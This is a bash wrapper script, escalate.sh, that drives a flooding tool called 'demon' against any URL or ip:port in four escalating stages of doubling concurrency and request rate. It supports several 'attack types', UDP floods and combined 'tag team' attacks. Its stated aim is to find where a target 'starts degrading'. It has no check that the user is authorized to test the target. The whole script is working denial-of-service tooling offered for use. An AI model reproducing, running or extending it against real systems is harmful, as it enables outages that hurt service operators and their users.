#!/usr/bin/env bash
# escalate.sh ramps up attack pressure in stages, pausing between each.
# useful for finding the threshold where a target starts degrading rather
# than just hammering it at full power from the start.
#
# usage:
#   ./escalate.sh <target> [attack_type]
#
#   target    required. url or ip:port for udp (attack type 10)
#   attack_type optional. defaults to 0 (volume). pass any valid type 0-10,
#               or a comma separated tag team list like "2,7"
#
# each stage doubles concurrency and rate. ctrl+c at any stage cleanly stops
# the current run and exits without starting the next stage.

set -euo pipefail

TARGET="${1:-}"
ATTACK_TYPE="${2:-0}"

if [[ -z "$TARGET" ]]; then
    echo "usage: $0 <target> [attack_type]"
    echo "  example: $0 https://example.com 2"
    echo "  example: $0 https://example.com 2,7"
    exit 1
fi

BINARY="$(dirname "$0")/demon"
if [[ ! -x "$BINARY" ]]; then
    echo "demon binary not found at $BINARY — run: go build -o demon ."
    exit 1
fi

# show public ip so you know what source ip hits the target
PUBLIC_IP="$(curl -sf --max-time 4 https://api.ipify.org 2>/dev/null || echo "unknown")"
echo ""
echo "target:     $TARGET"
echo "attack:     $ATTACK_TYPE"
echo "source ip:  $PUBLIC_IP"
echo ""

# stages: [concurrency, rate, duration]
# each stage is roughly 2x the previous in pressure.
# edit these freely to match your situation.
STAGES=(
    "50   500   90s"
    "150  2000  2m"
    "300  5000  3m"
    "600  10000 5m"
)

STAGE_NAMES=(
    "stage 1 — light probe"
    "stage 2 — moderate pressure"
    "stage 3 — heavy pressure"
    "stage 4 — maximum pressure"
)

CURRENT_PID=""

cleanup() {
    echo ""
    echo "stopping."
    if [[ -n "$CURRENT_PID" ]] && kill -0 "$CURRENT_PID" 2>/dev/null; then
        kill "$CURRENT_PID"
        wait "$CURRENT_PID" 2>/dev/null || true
    fi
    exit 0
}

trap cleanup SIGINT SIGTERM

for i in "${!STAGES[@]}"; do
    read -r CONC RATE DUR <<< "${STAGES[$i]}"

    echo "--- ${STAGE_NAMES[$i]} ---"
    echo "concurrency=$CONC  rate=$RATE  duration=$DUR"
    echo ""

    "$BINARY" \
        -attack "$ATTACK_TYPE" \
        -concurrency "$CONC" \
        -rate "$RATE" \
        -duration "$DUR" \
        "$TARGET" &

    CURRENT_PID=$!

  # wait for this stage to finish. if the user hits ctrl+c the trap fires
    # and kills the child before we reach the next iteration.
    wait "$CURRENT_PID"
    CURRENT_PID=""

     # only pause between stages not after the last one
    if [[ $i -lt $(( ${#STAGES[@]} - 1 )) ]]; then
        echo ""
        echo "stage complete. starting next stage in 5 seconds (ctrl+c to stop)..."
        sleep 5
    fi
done

echo ""
echo "all stages complete."
